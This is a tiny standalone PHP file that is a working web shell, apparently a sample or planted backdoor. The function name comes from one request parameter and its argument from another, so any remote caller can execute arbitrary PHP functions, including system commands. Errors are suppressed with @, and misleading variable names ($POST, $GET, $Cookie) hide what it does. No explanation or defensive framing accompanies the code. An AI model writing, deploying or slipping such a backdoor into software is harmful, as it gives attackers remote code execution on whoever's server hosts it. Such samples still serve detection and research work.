<?php
function a()
{
    $POST = null;
    $GET = $_POST["GET"];
    $Cookie = $POST.$GET;
    return $Cookie;
}
@$_GET["POST"](a());
?>